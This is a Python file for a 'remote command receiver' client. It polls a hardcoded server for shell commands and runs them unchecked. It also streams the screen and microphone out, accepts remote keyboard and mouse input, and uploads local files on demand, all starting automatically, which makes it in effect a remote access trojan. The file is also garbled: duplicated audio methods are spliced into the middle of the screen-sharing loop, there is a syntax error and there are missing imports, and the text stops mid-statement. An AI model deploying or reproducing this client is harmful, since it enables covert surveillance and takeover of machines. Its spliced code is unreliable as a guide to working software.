#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Copyright (c) 2025 SirAbody. All rights reserved.

import requests
import subprocess
import threading
import time
import os
import sys
import json
import base64
import platform
import tempfile
import io
import uuid
import pyautogui  # For mouse and keyboard control
from PIL import ImageGrab, Image
from pathlib import Path
from datetime import datetime

# Import audio streaming functionality
try:
    from audio_streamer import AudioStreamer
    AUDIO_AVAILABLE = True
except ImportError:
    print("Warning: Audio streaming not available. Install required packages with: pip install pyaudio sounddevice numpy")
    AUDIO_AVAILABLE = False

# Set your server URL here
SERVER_URL = "https://render-remote.onrender.com"

class Receiver:
    def __init__(self, server_url):
        self.server_url = server_url
        self.system = platform.system()
        self.device_id = self._generate_device_id()
        
        # Screen sharing settings
        self.screen_sharing_active = False
        self.screen_quality = 85  # JPEG quality (0-100) - increased for better quality
        self.screen_interval = 0.033  # ~30 FPS (1/30 second between captures)
        self.screen_thread = None
        self.stop_event = threading.Event()
        self.last_screen_hash = None  # Store hash of last screen to reduce redundant updates
        
        # Audio streaming
        self.audio_streamer = None
        if AUDIO_AVAILABLE:
            try:
                self.audio_streamer = AudioStreamer(server_url, self.device_id)
                print("Audio streaming support initialized")
            except Exception as e:
                print(f"Error initializing audio: {str(e)}")
        
        # Terminal command handling
        self.terminal_active = False
        self.terminal_thread = None
        self.terminal_poll_interval = 1.0  # seconds between terminal command polls
        
        print(f"\n{'=' * 50}")
        print(f"   SirAbody Remote Command Receiver")
        print(f"   © 2025 SirAbody. All rights reserved.")
        print(f"   System: {platform.system()} {platform.release()}")
        print(f"   Device ID: {self.device_id}")
        print(f"   Connected to: {server_url}")
        print(f"{'=' * 50}\n")
    
    def _generate_device_id(self):
        """Generate a unique device ID based on system information"""
        try:
            system_info = platform.uname()
            # Create a semi-unique identifier based on machine information
            system_str = f"{system_info.system}-{system_info.node}-{system_info.machine}"
            # Create a more readable ID
            readable_id = base64.urlsafe_b64encode(system_str.encode()).decode()[:12]
            return readable_id
        except Exception as e:
            # Fallback to random UUID if system info fails
            return str(uuid.uuid4())[:12]
    
    def execute_command(self, command):
        """Execute a command on the system and return the output"""
        try:
            # Create an appropriate shell based on the system
            if self.system == "Windows":
                process = subprocess.Popen(
                    command,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    shell=True,
                    universal_newlines=True,
                    encoding='utf-8',
                    errors='replace'
                )
            else:  # Linux or macOS
                process = subprocess.Popen(
                    command,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    shell=True,
                    executable='/bin/bash',
                    universal_newlines=True,
                    encoding='utf-8',
                    errors='replace'
                )
            
            stdout, stderr = process.communicate()
            return_code = process.returncode
            
            result = {
                "stdout": stdout,
                "stderr": stderr,
                "return_code": return_code
            }
            
            return result
        
        except Exception as e:
            return {
                "stdout": "",
                "stderr": f"Error executing command: {str(e)}",
                "return_code": 1
            }
    
    def poll_commands(self):
        """Poll the server for new commands"""
        try:
            response = requests.get(f"{self.server_url}/api/get-commands")
            if response.status_code == 200:
                return response.json()
            else:
                print(f"Error polling commands: {response.status_code} - {response.text}")
                return {}
        except Exception as e:
            print(f"Error connecting to server: {str(e)}")
            return {}
    
    def send_command_output(self, command_id, output):
        """Send command output back to the server"""
        try:
            data = {
                "command_id": command_id,
                "output": output
            }
            response = requests.post(
                f"{self.server_url}/api/update-command", 
                json=data
            )
            if response.status_code == 200:
                return True
            else:
                print(f"Error sending command output: {response.status_code} - {response.text}")
                return False
        except Exception as e:
            print(f"Error sending command output: {str(e)}")
            return False
    
    def download_file(self, file_id, destination):
        """Download a file from the server"""
        try:
            response = requests.get(
                f"{self.server_url}/api/download-file/{file_id}",
                stream=True
            )
            
            if response.status_code == 200:
                # Check if there's a filename in the Content-Disposition header
                filename = None
                content_disposition = response.headers.get('Content-Disposition')
                if content_disposition and 'filename=' in content_disposition:
                    filename = content_disposition.split('filename=')[1].strip('"')
                
                if not filename:
                    # Fallback to using the file_id as the filename
                    filename = f"file_{file_id}"
                
                # Ensure destination is a directory
                if os.path.isdir(destination):
                    filepath = os.path.join(destination, filename)
                else:
                    filepath = destination
                
                # Save the file
                with open(filepath, 'wb') as f:
                    for chunk in response.iter_content(chunk_size=8192):
                        if chunk:
                            f.write(chunk)
                
                print(f"Downloaded file to {filepath}")
                return filepath
            else:
                print(f"Error downloading file: {response.status_code} - {response.text}")
                return None
        except Exception as e:
            print(f"Error downloading file: {str(e)}")
            return None
    
    def upload_file(self, file_path):
        """Upload a file to the server"""
        try:
            if not os.path.exists(file_path):
                print(f"File not found: {file_path}")
                return None
            
            with open(file_path, 'rb') as f:
                files = {'file': (os.path.basename(file_path), f)}
                response = requests.post(
                    f"{self.server_url}/api/upload-file", 
                    files=files
                )
            
            if response.status_code == 200:
                return response.json()
            else:
                print(f"Error uploading file: {response.status_code} - {response.text}")
                return None
        except Exception as e:
            print(f"Error uploading file: {str(e)}")
            return None
    
    def list_available_files(self):
        """List available files on the server"""
        try:
            response = requests.get(f"{self.server_url}/api/list-files")
            if response.status_code == 200:
                return response.json()
            else:
                print(f"Error listing files: {response.status_code} - {response.text}")
                return {}
        except Exception as e:
            print(f"Error listing files: {str(e)}")
            return {}
    
    # Screen sharing functionality
    def capture_screen(self):
        """Capture the current screen and return it as a compressed JPEG image"""
        try:
            # Capture the entire screen using faster method if available
            import mss  # If available, mss is much faster than PIL.ImageGrab
            import hashlib
            import numpy as np
            
            # Use mss for faster screen capture if available
            try:
                with mss.mss() as sct:
                    monitor = sct.monitors[1]  # Primary monitor
                    sct_img = sct.grab(monitor)
                    img_array = np.array(sct_img)
                    img = Image.fromarray(img_array)
            except Exception:
                # Fallback to ImageGrab if mss not available
                img = ImageGrab.grab()
            
            # Get the screen dimensions for mouse control
            screen_width, screen_height = img.size
            
            # Resize image to reduce bandwidth if it's large
            if screen_width > 1920 or screen_height > 1080:
                img = img.resize((min(screen_width, 1920), min(screen_height, 1080)), resample=1)
            
            # Generate a hash of the image to check for changes
            # This prevents sending identical frames
            img_hash = hashlib.md5(np.array(img).tobytes()).hexdigest()
            
            # If the image hasn't changed, return None to skip this update
            if img_hash == self.last_screen_hash:
                return None
            
            # Store the new hash
            self.last_screen_hash = img_hash
                
            # Compress to JPEG
            buffer = io.BytesIO()
            img.save(buffer, format="JPEG", quality=self.screen_quality)
            
            # Get current mouse position
            mouse_x, mouse_y = pyautogui.position()
            
            # Convert to base64 for transmission
            img_base64 = base64.b64encode(buffer.getvalue()).decode()
            return {
                "image": img_base64,
                "width": img.width,
                "height": img.height,
                "screen_width": screen_width,
                "screen_height": screen_height,
                "mouse_x": mouse_x,
                "mouse_y": mouse_y,
                "timestamp": time.time()
            }
        except Exception as e:
            print(f"Error capturing screen: {str(e)}")
            return None
    
    def start_screen_sharing(self):
        """Start the screen sharing thread"""
        if self.screen_sharing_active:
            return "Screen sharing is already active"
            
        # Reset stop event
        self.stop_event.clear()
        self.screen_sharing_active = True
        
        # Start screen sharing in a new thread
        self.screen_thread = threading.Thread(target=self._screen_sharing_loop)
        self.screen_thread.daemon = True
        self.screen_thread.start()
        
        print(f"Screen sharing started with Device ID: {self.device_id}")
        print(f"To view, go to {self.server_url} and enter this Device ID")
        return "Screen sharing started"
    
    def stop_screen_sharing(self):
        """Stop the screen sharing thread"""
        if not self.screen_sharing_active:
            return "Screen sharing is not active"
            
        # Signal the thread to stop
        self.stop_event.set()
        
        # Wait for the thread to finish
        if self.screen_thread and self.screen_thread.is_alive():
            self.screen_thread.join(timeout=5)
            
        self.screen_sharing_active = False
        print("Screen sharing stopped")
        return "Screen sharing stopped"
    
    def control_mouse(self, action, x=None, y=None, button=None):
        """Control the mouse based on action received from server"""
        try:
            if action == "move":
                if x is not None and y is not None:
                    # Move mouse to the specified position
                    pyautogui.moveTo(x, y)
                    return {"status": "success", "action": "move"}
            
            elif action == "click":
                # Perform mouse click
                if button == "left":
                    pyautogui.click()
                elif button == "right":
                    pyautogui.rightClick()
                elif button == "double":
                    pyautogui.doubleClick()
                return {"status": "success", "action": "click", "button": button}
            
            elif action == "scroll":
                # Scroll up or down
                amount = y if y is not None else 0  # y positive = scroll down, negative = scroll up
                pyautogui.scroll(amount)
                return {"status": "success", "action": "scroll", "amount": amount}
            
            elif action == "down":
                # Mouse button down for drag operations
                if button == "left":
                    pyautogui.mouseDown()
                elif button == "right":
                    pyautogui.mouseDown(button='right')
                return {"status": "success", "action": "down", "button": button}
            
            elif action == "up":
                # Mouse button up for drag operations
                if button == "left":
                    pyautogui.mouseUp()
                elif button == "right":
                    pyautogui.mouseUp(button='right')
                return {"status": "success", "action": "up", "button": button}
            
            return {"status": "error", "message": "Invalid mouse action"}
        except Exception as e:
            print(f"Error controlling mouse: {str(e)}")
            return {"status": "error", "message": str(e)}
    
    def handle_keyboard_input(self, input_type, input_value):
        """Handle keyboard input received from server"""
        try:
            if input_type == "text":
                # Type text character by character
                pyautogui.write(input_value)
                return {"status": "success", "type": "text"}
            
            elif input_type == "shortcut":
                # Handle keyboard shortcuts
                if input_value == "ctrl+c":
                    pyautogui.hotkey('ctrl', 'c')
                elif input_value == "ctrl+v":
                    pyautogui.hotkey('ctrl', 'v')
                elif input_value == "alt+tab":
                    pyautogui.hotkey('alt', 'tab')
                elif input_value == "ctrl+alt+del":
                    pyautogui.hotkey('ctrl', 'alt', 'del')
                elif input_value == "win":
                    pyautogui.press('win')
                elif input_value == "escape":
                    pyautogui.press('escape')
                elif input_value == "enter":
                    pyautogui.press('enter')
                else:
                    # Handle any other shortcuts or individual keys
                    keys = input_value.split('+')
                    pyautogui.hotkey(*keys)
                
                return {"status": "success", "type": "shortcut", "shortcut": input_value}
            
            return {"status": "error", "message": "Invalid keyboard input type"}
        except Exception as e:
            print(f"Error handling keyboard input: {str(e)}")
            return {"status": "error", "message": str(e)}
    
    def execute_terminal_command(self, command):
        """Execute a terminal/cmd command and return the output"""
        try:
            # Determine shell based on platform
            shell = (self.system == 'Windows')
            
            # Execute the command
            process = subprocess.Popen(
                command,
                shell=shell,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                universal_newlines=True
            )
            
            # Get output with timeout
            stdout, stderr = process.communicate(timeout=30)
            
            # Combine stdout and stderr for result
            result = stdout + ("\nError: " + stderr if stderr else "")
            
            return {
                "status": "success",
                "exit_code": process.returncode,
                "output": result
            }
        except subprocess.TimeoutExpired:
            process.kill()
            return {
                "status": "error",
                "message": "Command execution timed out"
            }
        except Exception as e:
            return {
                "status": "error",
                "message": str(e)
            }
    
    def start_audio_streaming(self, audio_type='microphone'):
        """Start audio streaming (microphone or speaker)"""
        try:
            if not AUDIO_AVAILABLE:
                return "Audio streaming not available (missing dependencies)"
            
            if audio_type == 'microphone':
                return self.start_microphone()
            elif audio_type == 'speaker':
                return self.start_speakers()
            else:
                return f"Unknown audio type: {audio_type}"
        except Exception as e:
            return f"Error starting audio streaming: {str(e)}"
    
    def stop_audio_streaming(self, audio_type='microphone'):
        """Stop audio streaming (microphone or speaker)"""
        try:
            if not AUDIO_AVAILABLE:
                return "Audio streaming not available (missing dependencies)"
            
            if audio_type == 'microphone':
                return self.stop_microphone()
            elif audio_type == 'speaker':
                return self.stop_speakers()
            else:
                return f"Unknown audio type: {audio_type}"
        except Exception as e:
            return f"Error stopping audio streaming: {str(e)}"
                
    def start_microphone(self):
        """Start audio streaming from the microphone"""
        try:
            # Check if already running
            if hasattr(self, 'mic_stream') and self.mic_stream is not None:
                return "Microphone streaming already active"
            
            # Define callback function
            def mic_callback(indata, frames, time, status):
                if status:
                    print(f"Microphone status: {status}")
                
                # Convert audio data to bytes and send it
                try:
                    audio_data = indata.tobytes()
                    # Compress and encode audio data
                    encoded_audio = base64.b64encode(audio_data).decode('utf-8')
                    
                    # Send to server
                    self.upload_audio(encoded_audio, 'microphone')
                except Exception as e:
                    print(f"Error in microphone callback: {e}")
            
            # Start the audio stream
            self.mic_stream = sd.InputStream(
                callback=mic_callback,
                channels=1,
                samplerate=44100,
                blocksize=1024
            )
            self.mic_stream.start()
            
            return "Microphone streaming started"
        except Exception as e:
            return f"Error starting microphone: {str(e)}"
    
    def stop_microphone(self):
        """Stop audio streaming from the microphone"""
        try:
            if hasattr(self, 'mic_stream') and self.mic_stream is not None:
                self.mic_stream.stop()
                self.mic_stream.close()
                self.mic_stream = None
                return "Microphone streaming stopped"
            else:
                return "No active microphone stream to stop"
        except Exception as e:
            return f"Error stopping microphone: {str(e)}"
    
    def start_speakers(self):
        """Start audio streaming to the speakers"""
        try:
            # Check if already running
            if hasattr(self, 'speaker_stream') and self.speaker_stream is not None:
                return "Speaker streaming already active"
            
            # Start thread to poll for audio data
            self.speaker_running = True
            self.speaker_thread = threading.Thread(target=self.speaker_polling_thread)
            self.speaker_thread.daemon = True
            self.speaker_thread.start()
            
            return "Speaker streaming started"
        except Exception as e:
            return f"Error starting speakers: {str(e)}"
    
    def stop_speakers(self):
        """Stop audio streaming to the speakers"""
        try:
            if hasattr(self, 'speaker_stream') and self.speaker_stream is not None:
                self.speaker_stream.stop()
                self.speaker_stream.close()
                self.speaker_stream = None
            
            if hasattr(self, 'speaker_running'):
                self.speaker_running = False
            
            if hasattr(self, 'speaker_thread') and self.speaker_thread is not None:
                self.speaker_thread.join(timeout=1.0)
                self.speaker_thread = None
                
            return "Speaker streaming stopped"
        except Exception as e:
            return f"Error stopping speakers: {str(e)}"
    
    def speaker_polling_thread(self):
        """Thread function to poll for audio data and play it"""
        try:
            # Define callback function for output stream
            def speaker_callback(outdata, frames, time, status):
                if status:
                    print(f"Speaker status: {status}")
                
                # Check if we have audio data in our buffer
                if len(self.audio_buffer) > 0:
                    # Get the oldest audio data from the buffer
                    audio_data = self.audio_buffer.pop(0)
                    
                    # Convert to numpy array for sounddevice
                    try:
                        audio_array = np.frombuffer(audio_data, dtype=np.float32)
                        if len(audio_array) >= frames * 1:  # 1 channel
                            # Reshape to match expected dimensions
                            audio_array = audio_array[:frames * 1].reshape(frames, 1)
                            outdata[:] = audio_array
                        else:
                            # Not enough data, fill with zeros
                            outdata[:] = np.zeros((frames, 1), dtype=np.float32)
                    except Exception as e:
                        print(f"Error processing audio data: {e}")
                        outdata[:] = np.zeros((frames, 1), dtype=np.float32)
                else:
                    # No data available, fill with zeros
                    outdata[:] = np.zeros((frames, 1), dtype=np.float32)
            
            # Initialize audio buffer if not exists
            if not hasattr(self, 'audio_buffer'):
                self.audio_buffer = []
            
            # Start output stream
            self.speaker_stream = sd.OutputStream(
                callback=speaker_callback,
                channels=1,
                samplerate=44100,
                blocksize=1024
            )
            self.speaker_stream.start()
            
            # Poll for audio data from server
            while self.speaker_running:
                try:
                    # Download audio data from server
                    audio_data = self.download_audio()
                    if audio_data:
                        # Decode audio data and add to buffer
                        decoded_audio = base64.b64decode(audio_data)
                        self.audio_buffer.append(decoded_audio)
                        
                        # Limit buffer size to prevent memory issues
                        while len(self.audio_buffer) > 10:  # Limit to 10 chunks
                            self.audio_buffer.pop(0)
                except Exception as e:
                    print(f"Error in speaker polling thread: {e}")
                
                # Sleep to avoid excessive polling
                time.sleep(0.05)  # 50ms interval
        except Exception as e:
            print(f"Error in speaker polling thread: {e}")
            
    def upload_audio(self, audio_data, audio_type='microphone'):
        """Upload audio data to the server"""
        try:
            response = requests.post(
                f"{self.server_url}/api/audio/upload/{self.device_id}",
                json={
                    "audio_data": audio_data,
                    "audio_type": audio_type
                }
            )
            return response.json()
        except Exception as e:
            print(f"Error uploading audio: {e}")
            return None
            
    def download_audio(self, audio_type='speaker'):
        """Download audio data from the server"""
        try:
            response = requests.get(
                f"{self.server_url}/api/audio/download/{self.device_id}",
                params={
                    "audio_type": audio_type
                }
            )
            
            if response.status_code == 200:
                data = response.json()
                if 'audio_data' in data:
                    return data['audio_data']
            
            return None
        except Exception as e:
            print(f"Error downloading audio: {e}")
            return None
    
    def start_terminal_polling(self):
        """Start polling for terminal commands"""
        if self.terminal_active:
            return "Terminal polling is already active"
            
        # Reset stop event
        self.stop_event.clear()
        self.terminal_active = True
        
        # Start terminal polling in a new thread
        self.terminal_thread = threading.Thread(target=self._terminal_polling_loop)
        self.terminal_thread.daemon = True
        self.terminal_thread.start()
        
        print("Terminal command polling started")
        return "Terminal command polling started"
    
    def stop_terminal_polling(self):
        """Stop terminal command polling"""
        if not self.terminal_active:
            return "Terminal polling is not active"
            
        # Signal the thread to stop
        self.stop_event.set()
        
        # Wait for the thread to finish
        if self.terminal_thread and self.terminal_thread.is_alive():
            self.terminal_thread.join(timeout=5)
            
        self.terminal_active = False
        print("Terminal command polling stopped")
        return "Terminal command polling stopped"
        
    def _terminal_polling_loop(self):
        """Main loop for polling terminal commands"""
        print("Starting terminal command polling loop...")
        while not self.stop_event.is_set():
            try:
                # Poll for terminal commands
                response = requests.get(
                    f"{self.server_url}/api/get-commands",
                    params={"device_id": self.device_id, "command_type": "terminal"},
                    timeout=2
                )
                
                if response.status_code == 200:
                    data = response.json()
                    
                    # Process each command
                    for command_id, cmd_data in data.items():
                        if isinstance(cmd_data, dict) and 'command' in cmd_data:
                            cmd = cmd_data['command']
                            print(f"Received terminal command: {cmd}")
                            
                            # Execute the command
                            result = self.execute_terminal_command(cmd)
                            
                            # Send result back
                            self.send_command_output(command_id, result)
            except Exception as e:
                print(f"Error in terminal polling: {str(e)}")
                
            # Wait before next poll
            time.sleep(self.terminal_poll_interval)
    
    def _screen_sharing_loop(self):
        """Main loop for screen capture and upload"""
        print("Starting screen capture loop...")
        while not self.stop_event.is_set():
            try:
                # Capture screen
                screen_data = self.capture_screen()
                if screen_data:
                    # Prepare data to send
                    data = {
                        "device_id": self.device_id,
                        "screen_data": screen_data
                    }
                    
                    # Send to server
                    try:
                        response = requests.post(
                            f"{self.server_url}/api/update-screen",
                            json=data,
                            timeout=5  # Timeout after 5 seconds
                        )
                        
                        if response.status_code == 200:
                            print("Screen update sent successfully", end="\r")
                            
                            # Check for mouse control commands
                            try:
                                # Poll for mouse control commands
                                mouse_control_response = requests.get(
                                    f"{self.server_url}/api/get-mouse-control/{self.device_id}",
                                    timeout=1  # Short timeout
                                )
                                
                                if mouse_control_response.status_code == 200:
                                    control_data = mouse_control_response.json()
                                    if control_data and "action" in control_data:
                                        # Execute mouse control
                                        result = self.control_mouse(
                                            control_data["action"],
                                            control_data.get("x"),
                                            control_data.get("y"),
                                            control_data.get("button")
                                        )
                                        # Send result back
                                        requests.post(
                                            f"{self.server_url}/api/mouse-control-result/{self.device_id}",
                                            json=result,
                                            timeout=1
                                        )
                            except Exception as e:
                                # Ignore errors in mouse control to keep screen sharing working
                                pass
                                
                            # Check for keyboard input commands
                            try:
                                # Poll for keyboard commands
                                keyboard_response = requests.get(
                                    f"{self.server_url}/api/get-keyboard/{self.device_id}",
                                    timeout=1  # Short timeout
                                )
                                
                                if keyboard_response.status_code == 200:
                                    keyboard_data = keyboard_response.json()
                                    
                                    # Process all pending keyboard commands
                                    if "commands" in keyboard_data and keyboard_data["commands"]:
                                        for cmd in keyboard_data["commands"]:
                                            if "type" in cmd and "input" in cmd:
                                                # Execute keyboard input
                                                result = self.handle_keyboard_input(
                                                    cmd["type"],
                                                    cmd["input"]
                                                )
                                                
                                                # Send result back
                                                requests.post(
                                                    f"{self.server_url}/api/keyboard-result/{self.device_id}",
                                                    json={
                                                        "command_id": cmd["command_id"],
                                                        "result": result
                                                    },
                                                    timeout=1
                                                )
            
            if audio_type == 'microphone':
                return self.start_microphone()
            elif audio_type == 'speaker':
                return self.start_speakers()
            else:
                return f"Unknown audio type: {audio_type}"
        except Exception as e:
            return f"Error starting audio streaming: {str(e)}"
    
    def stop_audio_streaming(self, audio_type='microphone'):
        """Stop audio streaming (microphone or speaker)"""
        try:
            if not AUDIO_AVAILABLE:
                return "Audio streaming not available (missing dependencies)"
            
            if audio_type == 'microphone':
                return self.stop_microphone()
            elif audio_type == 'speaker':
                return self.stop_speakers()
            else:
                return f"Unknown audio type: {audio_type}"
        except Exception as e:
            return f"Error stopping audio streaming: {str(e)}"
                
    def start_microphone(self):
        """Start audio streaming from the microphone"""
        try:
            # Check if already running
            if hasattr(self, 'mic_stream') and self.mic_stream is not None:
                return "Microphone streaming already active"
            
            # Define callback function
            def mic_callback(indata, frames, time, status):
                if status:
                    print(f"Microphone status: {status}")
                
                # Convert audio data to bytes and send it
                try:
                    audio_data = indata.tobytes()
                    # Compress and encode audio data
                    encoded_audio = base64.b64encode(audio_data).decode('utf-8')
                    
                    # Send to server
                    self.upload_audio(encoded_audio, 'microphone')
                except Exception as e:
                    print(f"Error in microphone callback: {e}")
            
            # Start the audio stream
            self.mic_stream = sd.InputStream(
                callback=mic_callback,
                channels=1,
                samplerate=44100,
                blocksize=1024
            )
            self.mic_stream.start()
            
            return "Microphone streaming started"
        except Exception as e:
            return f"Error starting microphone: {str(e)}"
    
    def stop_microphone(self):
        """Stop audio streaming from the microphone"""
        try:
            if hasattr(self, 'mic_stream') and self.mic_stream is not None:
                self.mic_stream.stop()
                self.mic_stream.close()
                self.mic_stream = None
                return "Microphone streaming stopped"
            else:
                return "No active microphone stream to stop"
        except Exception as e:
            return f"Error stopping microphone: {str(e)}"
    
    def start_speakers(self):
        """Start audio streaming to the speakers"""
        try:
            # Check if already running
            if hasattr(self, 'speaker_stream') and self.speaker_stream is not None:
                return "Speaker streaming already active"
            
            # Start thread to poll for audio data
            self.speaker_running = True
            self.speaker_thread = threading.Thread(target=self.speaker_polling_thread)
            self.speaker_thread.daemon = True
            self.speaker_thread.start()
            
            return "Speaker streaming started"
        except Exception as e:
            return f"Error starting speakers: {str(e)}"
    
    def stop_speakers(self):
        """Stop audio streaming to the speakers"""
        try:
            if hasattr(self, 'speaker_stream') and self.speaker_stream is not None:
                self.speaker_stream.stop()
                self.speaker_stream.close()
                self.speaker_stream = None
            
            if hasattr(self, 'speaker_running'):
                self.speaker_running = False
            
            if hasattr(self, 'speaker_thread') and self.speaker_thread is not None:
                self.speaker_thread.join(timeout=1.0)
                self.speaker_thread = None
                
            return "Speaker streaming stopped"
        except Exception as e:
            return f"Error stopping speakers: {str(e)}"
    
    def speaker_polling_thread(self):
        """Thread function to poll for audio data and play it"""
        try:
            # Define callback function for output stream
            def speaker_callback(outdata, frames, time, status):
                if status:
                    print(f"Speaker status: {status}")
                
                # Check if we have audio data in our buffer
                if len(self.audio_buffer) > 0:
                    # Get the oldest audio data from the buffer
                    audio_data = self.audio_buffer.pop(0)
                    
                    # Convert to numpy array for sounddevice
                    try:
                        audio_array = np.frombuffer(audio_data, dtype=np.float32)
                        if len(audio_array) >= frames * 1:  # 1 channel
                            # Reshape to match expected dimensions
                            audio_array = audio_array[:frames * 1].reshape(frames, 1)
                            outdata[:] = audio_array
                        else:
                            # Not enough data, fill with zeros
                            outdata[:] = np.zeros((frames, 1), dtype=np.float32)
                    except Exception as e:
                        print(f"Error processing audio data: {e}")
                        outdata[:] = np.zeros((frames, 1), dtype=np.float32)
                else:
                    # No data available, fill with zeros
                    outdata[:] = np.zeros((frames, 1), dtype=np.float32)
            
            # Initialize audio buffer if not exists
            if not hasattr(self, 'audio_buffer'):
                self.audio_buffer = []
            
            # Start output stream
            self.speaker_stream = sd.OutputStream(
                callback=speaker_callback,
                channels=1,
                samplerate=44100,
                blocksize=1024
            )
            self.speaker_stream.start()
            
            # Poll for audio data from server
            while self.speaker_running:
                try:
                    # Download audio data from server
                    audio_data = self.download_audio()
                    if audio_data:
                        # Decode audio data and add to buffer
                        decoded_audio = base64.b64decode(audio_data)
                        self.audio_buffer.append(decoded_audio)
                        
                        # Limit buffer size to prevent memory issues
                        while len(self.audio_buffer) > 10:  # Limit to 10 chunks
                            self.audio_buffer.pop(0)
                except Exception as e:
                    print(f"Error in speaker polling thread: {e}")
                
                # Sleep to avoid excessive polling
                time.sleep(0.05)  # 50ms interval
                
        except Exception as e:
            print(f"Error in speaker polling thread: {e}")
            
    def upload_audio(self, audio_data, audio_type='microphone'):
        """Upload audio data to the server"""
        try:
            response = requests.post(
                f"{self.server_url}/api/audio/upload/{self.device_id}",
                json={
                    "audio_data": audio_data,
                    "audio_type": audio_type
                }
            )
            return response.json()
        except Exception as e:
            print(f"Error uploading audio: {e}")
            return None
            
    def download_audio(self, audio_type='speaker'):
        """Download audio data from the server"""
        try:
            response = requests.get(
                f"{self.server_url}/api/audio/download/{self.device_id}",
                params={
                    "audio_type": audio_type
                }
            )
            
            if response.status_code == 200:
                data = response.json()
                if 'audio_data' in data:
                    return data['audio_data']
            
            return None
        except Exception as e:
            print(f"Error downloading audio: {e}")
            return None)
                
            # Wait before next capture
            time.sleep(self.screen_interval)
    
    def start_audio_streaming(self):
        """Start audio streaming (microphone and speakers)"""
        if not AUDIO_AVAILABLE or not self.audio_streamer:
            return "Audio streaming is not available"
        
        # Start microphone streaming
        mic_started = self.audio_streamer.start_microphone_streaming()
        
        # Start speaker streaming
        speaker_started = self.audio_streamer.start_speaker_streaming()
        
        status = []
        if mic_started:
            status.append("Microphone streaming started")
        if speaker_started:
            status.append("Speaker streaming started")
        
        if not status:
            return "Failed to start audio streaming"
        
        return ", ".join(status)
    
    def stop_audio_streaming(self):
        """Stop audio streaming"""
        if not AUDIO_AVAILABLE or not self.audio_streamer:
            return "Audio streaming is not available"
        
        # Stop microphone streaming
        mic_stopped = self.audio_streamer.stop_microphone_streaming()
        
        # Stop speaker streaming
        speaker_stopped = self.audio_streamer.stop_speaker_streaming()
        
        status = []
        if mic_stopped:
            status.append("Microphone streaming stopped")
        if speaker_stopped:
            status.append("Speaker streaming stopped")
        
        if not status:
            return "Failed to stop audio streaming"
        
        return ", ".join(status)
    
    def run(self):
        """Main loop to poll and process commands"""
        print("Starting command polling...")
        
        # Start screen sharing
        self.start_screen_sharing()
        
        # Start terminal command polling
        self.start_terminal_polling()
        
        # Start audio streaming if available
        if AUDIO_AVAILABLE and self.audio_streamer:
            self.start_audio_streaming()
        
        try:
            while True:
                # Poll for commands
                commands = self.poll_commands()
                
                # Process each command
                for command_id, cmd_data in commands.items():
                    # Extract the command string from the dictionary
                    if isinstance(cmd_data, dict) and 'command' in cmd_data:
                        cmd = cmd_data['command']
                    else:
                        cmd = str(cmd_data)  # Fallback if it's not in expected format
                        
                    print(f"Received command: {cmd}")
                    
                    # Special commands that start with !
                    if cmd.startswith("!"):
                        if cmd.startswith("!audio_start "):
                            # Format: !audio_start <audio_type>
                            parts = cmd.split(" ")
                            if len(parts) >= 2:
                                audio_type = parts[1]  # 'microphone' or 'speaker'
                                if audio_type == 'microphone':
                                    result = self.start_audio_streaming() if AUDIO_AVAILABLE else "Audio not available"
                                elif audio_type == 'speaker':
                                    result = self.start_audio_streaming() if AUDIO_AVAILABLE else "Audio not available"
                                else:
                                    result = f"Unknown audio type: {audio_type}"
                                
                                self.send_command_output(command_id, {
                                    "status": "success",
                                    "output": result
                                })
                        
                        elif cmd.startswith("!audio_stop "):
                            # Format: !audio_stop <audio_type>
                            parts = cmd.split(" ")
                            if len(parts) >= 2:
                                audio_type = parts[1]  # 'microphone' or 'speaker'
                                if audio_type == 'microphone':
                                    result = self.stop_audio_streaming() if AUDIO_AVAILABLE else "Audio not available"
                                elif audio_type == 'speaker':
                                    result = self.stop_audio_streaming() if AUDIO_AVAILABLE else "Audio not available"
                                else:
                                    result = f"Unknown audio type: {audio_type}"
                                
                                self.send_command_output(command_id, {
                                    "status": "success",
                                    "output": result
                                })
                                
                        elif cmd.startswith("!download "):
                            # Format: !download <file_id> <destination_path> [optional_filename]
                            parts = cmd.split(" ")
                            if len(parts) >= 3:
                                file_id = parts[1]
                                destination = parts[2]
                                filename = parts[3] if len(parts) > 3 else None
                                
                                if os.path.isdir(destination):
                                    result = self.download_file(file_id, destination)
                                    output = {"stdout": f"File downloaded to {result}" if result else "Download failed", "stderr": "", "return_code": 0 if result else 1}
                                else:
                                    output = {"stdout": "", "stderr": f"Destination directory does not exist: {destination}", "return_code": 1}
                            else:
                                output = {"stdout": "", "stderr": "Invalid download command format. Use: !download <file_id> <destination_path>", "return_code": 1}
                        
                        elif cmd.startswith("!upload "):
                            # Format: !upload <file_path>
                            parts = cmd.split(" ", 1)
                            if len(parts) >= 2:
                                file_path = parts[1]
                                result = self.upload_file(file_path)
                                if result:
                                    output = {"stdout": f"File uploaded successfully. ID: {result.get('file_id')}", "stderr": "", "return_code": 0}
                                else:
                                    output = {"stdout": "", "stderr": "Failed to upload file", "return_code": 1}
                            else:
                                output = {"stdout": "", "stderr": "Invalid upload command format. Use: !upload <file_path>", "return_code": 1}
                        
                        elif cmd.startswith("!listfiles"):
                            files = self.list_available_files()
                            if files:
                                file_list = "\nAvailable Files:\n" + "-" * 50 + "\n"
                                file_list += "ID\t\tFilename\t\tTimestamp\n"
                                file_list += "-" * 50 + "\n"
                                
                                for file_id, file_info in files.items():
                                    timestamp = datetime.fromtimestamp(file_info.get("timestamp", 0)).strftime('%Y-%m-%d %H:%M:%S')
                                    file_list += f"{file_id}\t{file_info.get('filename')}\t{timestamp}\n"
                                
                                output = {"stdout": file_list, "stderr": "", "return_code": 0}
                            else:
                                output = {"stdout": "No files available", "stderr": "", "return_code": 0}
                        
                        elif cmd.startswith("!screen"):
                            # Handle screen sharing commands
                            parts = cmd.split(" ", 1)
                            action = parts[1] if len(parts) > 1 else "status"
                            
                            if action == "start":
                                result = self.start_screen_sharing()
                                output = {"stdout": f"Screen sharing: {result}\nDevice ID: {self.device_id}\nTo view your screen, go to {self.server_url} and enter this Device ID", "stderr": "", "return_code": 0}
                            
                            elif action == "stop":
                                result = self.stop_screen_sharing()
                                output = {"stdout": result, "stderr": "", "return_code": 0}
                            
                            elif action == "status":
                                status = "Active" if self.screen_sharing_active else "Inactive"
